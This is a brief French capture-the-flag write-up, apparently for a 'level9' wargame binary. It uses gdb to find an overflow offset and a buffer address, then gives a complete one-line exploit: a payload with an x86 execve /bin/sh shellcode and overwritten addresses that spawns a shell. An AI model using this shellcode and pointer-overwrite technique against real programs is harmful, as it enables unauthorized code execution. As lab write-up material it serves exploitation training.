10. On voit que le code est en C++ en desassemblant avec gdb disas main. On tente de mettre une chaine generee pour faire cracher le programme. Il segfault. On affiche EAX (info register) qui contient une adresse 0x41366441. On va sur le site de jason-rush on voit que cela correspond a un offset de 108. On tente de retrouver notre chaine dans la memoire pour cela on met un breakpoint au-dessus de setAnnotation. Puis on dump eax avec x/50s $eax et on voit qu'a l'adresse 0x804a00c "a" est repete n fois. Juste en dessous on veut modifier le call a EDX pour appeller un shellcode. 	Pour cela on genere un payload	 avec l'adresse de notre chaine + 4 + shellcode + offset (-taille du shellcode) + adresse de notre chaine.
./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
Bibadaboum.
